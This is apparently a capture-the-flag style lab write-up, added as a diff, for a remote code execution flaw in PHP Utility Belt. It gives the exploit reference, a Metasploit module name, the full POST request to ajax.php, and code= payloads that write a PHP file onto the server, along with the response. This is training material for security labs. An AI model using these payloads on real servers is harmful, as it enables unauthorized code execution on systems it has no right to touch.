@@ -1,0 +1,62 @@
+#########################################################
+Mission provided by attack defense lab
+#########################################################
+A version of PHP Utility Belt is vulnerable to a remote code execution attack.
+Objective: Your task is to find and exploit this vulnerability.
+
+#########################################################
+
+Version:  PHP/5.5.9 
+
+###############################################################
+
+Download Exploit:  https://www.exploit-db.com/exploits/38901
+
+msf module:  exploit/multi/http/php_utility_belt_rce
+
+###############################################################
+
+Vulnerable request:
+###############################################################
+POST /ajax.php HTTP/1.1
+Host: v7eno9avt6o4gtvdc33mmxjav.public1.attackdefenselabs.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Referer: http://v7eno9avt6o4gtvdc33mmxjav.public1.attackdefenselabs.com/
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 84
+Connection: close
+
+code=fwrite(fopen('info.php','w'),'<?php echo phpinfo();?>');
+
+######################################################################
+payload can be used:
+code=fwrite(fopen('info.php','w'),'<?php echo phpinfo();?>');
+code=fwrite(fopen('info.php','w'),'<?php echo "Remote code execution"?>');
+
+
+########################################################################
+
+Response 
+
+#########################################################################
+HTTP/1.1 200 OK
+Content-Length: 0
+Content-Type: text/plain
+Date: Sun, 27 Jan 2019 14:41:54 GMT
+Server: Apache/2.4.7 (Ubuntu)
+X-Powered-By: PHP/5.5.9-1ubuntu4.25
+Connection: close
+
+##########################################################################
+
+Go to website link and open the info.php.
+
+phpinfo() content has been copied inot the info.php file.
+
+http://v7eno9avt6o4gtvdc33mmxjav.public1.attackdefenselabs.com/info.php
+
+#######################################################################
+
